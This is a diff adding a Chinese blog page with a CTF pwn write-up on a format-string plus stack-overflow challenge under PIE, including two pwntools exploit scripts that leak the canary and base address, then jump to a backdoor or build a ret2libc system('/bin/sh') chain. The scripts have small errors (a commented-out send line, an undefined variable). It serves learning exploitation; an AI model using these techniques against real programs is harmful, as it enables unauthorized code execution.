@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"github.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="格式化字符串-2一道格式化字符串的题，难点主要在于开启了 PIE ，程序保护如下：   程序主逻辑如下：   程序存在后门：   程序存在明显的栈溢出漏洞和格式化字符串漏洞，所以尝试泄漏Canary后触发栈溢出从而跳转到后门函数。但是因为开启了PIE的缘故，IDA中只会显示函数的偏移，所以我们无法直接知道后门函数的地址，因此还需要再泄漏一个栈上的程序地址从而泄漏程序的基地址。 在IDA中找到存在漏">
+<meta property="og:type" content="article">
+<meta property="og:title" content="格式化字符串-2">
+<meta property="og:url" content="https://github.com/CharonPt/CharonPt.github.io.git/2021/11/21/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-2/index.html">
+<meta property="og:site_name" content="CharonPt的Blog">
+<meta property="og:description" content="格式化字符串-2一道格式化字符串的题，难点主要在于开启了 PIE ，程序保护如下：   程序主逻辑如下：   程序存在后门：   程序存在明显的栈溢出漏洞和格式化字符串漏洞，所以尝试泄漏Canary后触发栈溢出从而跳转到后门函数。但是因为开启了PIE的缘故，IDA中只会显示函数的偏移，所以我们无法直接知道后门函数的地址，因此还需要再泄漏一个栈上的程序地址从而泄漏程序的基地址。 在IDA中找到存在漏">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://github.com/2021/11/21/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-2/checksec.png">
+<meta property="og:image" content="https://github.com/2021/11/21/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-2/main.jpg">
+<meta property="og:image" content="https://github.com/2021/11/21/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-2/sys.jpg">
+<meta property="og:image" content="https://github.com/2021/11/21/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-2/%E8%B0%83%E8%AF%95-1.jpg">
+<meta property="og:image" content="https://github.com/2021/11/21/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-2/%E8%B0%83%E8%AF%95-2.png">
+<meta property="og:image" content="https://github.com/2021/11/21/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-2/%E8%B0%83%E8%AF%95-3.jpg">
+<meta property="og:image" content="https://github.com/2021/11/21/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-2/%E8%B0%83%E8%AF%95-4.jpg">
+<meta property="og:image" content="https://github.com/2021/11/21/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-2/%E8%B0%83%E8%AF%95-5.png">
+<meta property="article:published_time" content="2021-11-21T09:13:15.000Z">
+<meta property="article:modified_time" content="2021-11-21T10:09:19.651Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="格式化字符串">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/2021/11/21/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-2/checksec.png">
+
+<link rel="canonical" href="https://github.com/CharonPt/CharonPt.github.io.git/2021/11/21/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-2/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>格式化字符串-2 | CharonPt的Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">CharonPt的Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2021/11/21/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CharonPt的Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          格式化字符串-2
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-11-21 17:13:15 / 修改时间：18:09:19" itemprop="dateCreated datePublished" datetime="2021-11-21T17:13:15+08:00">2021-11-21</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="格式化字符串-2"><a href="#格式化字符串-2" class="headerlink" title="格式化字符串-2"></a>格式化字符串-2</h2><p>一道格式化字符串的题，难点主要在于开启了 PIE ，程序保护如下：</p>
+<img src="/2021/11/21/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-2/checksec.png" class>
+
+<p>程序主逻辑如下：</p>
+<img src="/2021/11/21/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-2/main.jpg" class>
+
+<p>程序存在后门：</p>
+<img src="/2021/11/21/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-2/sys.jpg" class>
+
+<p>程序存在明显的栈溢出漏洞和格式化字符串漏洞，所以尝试泄漏Canary后触发栈溢出从而跳转到后门函数。但是因为开启了PIE的缘故，IDA中只会显示函数的偏移，所以我们无法直接知道后门函数的地址，因此还需要再泄漏一个栈上的程序地址从而泄漏程序的基地址。</p>
+<p>在IDA中找到存在漏洞的printf()的偏移，并在gdb中下断点到此处</p>
+<img src="/2021/11/21/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-2/%E8%B0%83%E8%AF%95-1.jpg" class>
+
+<p>可以利用 <code>b *$rebase()</code> 命令进行相对偏移断点，但是该命令在程序运行中时才能使用，所以我们在脚本中执行，可以看到存在漏洞的printf()的栈空间如下：</p>
+<img src="/2021/11/21/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-2/%E8%B0%83%E8%AF%95-2.png" class>
+
+<p>显然光标处是一段在程序中的地址，我们用vmmap来验证一下：</p>
+<img src="/2021/11/21/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-2/%E8%B0%83%E8%AF%95-3.jpg" class>
+
+<p>可以看到确实是程序中的地址，同时我们查看程序的基地址：</p>
+<img src="/2021/11/21/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-2/%E8%B0%83%E8%AF%95-4.jpg" class>
+
+<p>因为开启了PIE的缘故，每次程序加载时其基址都会变化，但是内部代码的相对偏移是固定的，所以我们通过计算出我们泄漏的程序地址相对于基址的偏移，就可以实现泄漏程序基址的目的</p>
+<img src="/2021/11/21/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-2/%E8%B0%83%E8%AF%95-5.png" class>
+
+<p>我们计算出了偏移为 0x215c 个字节，只要我们每次将利用格式化字符串泄漏的那个程序地址 -0x215c 即可得到程序的基地址，同时我们又可以在IDA中找到后门函数使得偏移，这样就得到了每次程序运行时后门函数的真实地址。</p>
+<p>exp如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&quot;./ff&quot;)</span><br><span class="line">#gdb.attach(p,&quot;b *$rebase(0x13BB)&quot;)</span><br><span class="line">elf = ELF(&quot;./ff&quot;)</span><br><span class="line"></span><br><span class="line">#p.sendlineafter(&quot;name? &quot;,&#x27;%17$p%12$p&#x27;) # canary %17$p  program_addr %12$p</span><br><span class="line">p.recvuntil(&quot;0x&quot;)</span><br><span class="line">canary = int(p.recv(16),16)</span><br><span class="line">p.recvuntil(&quot;0x&quot;)</span><br><span class="line">pgm_addr = int(p.recv(12),16) - 0x215c</span><br><span class="line">print hex(canary)</span><br><span class="line">print hex(pgm_addr)</span><br><span class="line"></span><br><span class="line">sys_offset = 0x1228</span><br><span class="line">sys = pgm_addr + sys_offset</span><br><span class="line"></span><br><span class="line">payload = &quot;a&quot;*0x38 + p64(canary) + &quot;a&quot;*0x8 + p64(sys)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>假设这题没有后门函数，我们也可以利用类似的思想，通过泄漏栈上的libc函数的地址以及栈上的程序地址，从而得到gadget的真实地址，再ret2libc即可。</p>
+<p>exp如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line"></span><br><span class="line">p = process(&quot;./ff&quot;)</span><br><span class="line">libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">elf = ELF(&quot;./ff&quot;)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&quot;name? &quot;,&#x27;%17$p%23$p%12$p&#x27;) # canary:%17$p __libc_start_main:%23$p program_addr:%12$p</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;0x&quot;)</span><br><span class="line">canary = int(p.recv(16),16)</span><br><span class="line">p.recvuntil(&quot;0x&quot;)</span><br><span class="line">lsm = int(p.recv(12),16)-240</span><br><span class="line">p.recvuntil(&quot;0x&quot;)</span><br><span class="line">pgm_addr = int(p.recv(12),16) - 0x215c</span><br><span class="line">print hex(canary)</span><br><span class="line">print hex(lsm)</span><br><span class="line">print hex(pgm_addr)</span><br><span class="line"></span><br><span class="line">sys = lsm - libc.symbols[&#x27;__libc_start_main&#x27;] + libc.symbols[&#x27;system&#x27;]</span><br><span class="line">binsh = lsm - libc.symbols[&#x27;__libc_start_main&#x27;] + libc.search(&#x27;/bin/sh&#x27;).next()</span><br><span class="line"></span><br><span class="line">pop_rdi_offset = 0x14e3</span><br><span class="line">pop_rdi = pgm_addr + poffset</span><br><span class="line"></span><br><span class="line">payload = &quot;a&quot;*0x38 + p64(canary) + &quot;a&quot;*0x8 + p64(pop_rdi) + p64(binsh) + p64(sys)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" rel="tag"># 格式化字符串</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/11/18/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-1/" rel="prev" title="格式化字符串">
+      <i class="fa fa-chevron-left"></i> 格式化字符串
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-2"><span class="nav-number">1.</span> <span class="nav-text">格式化字符串-2</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">7</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
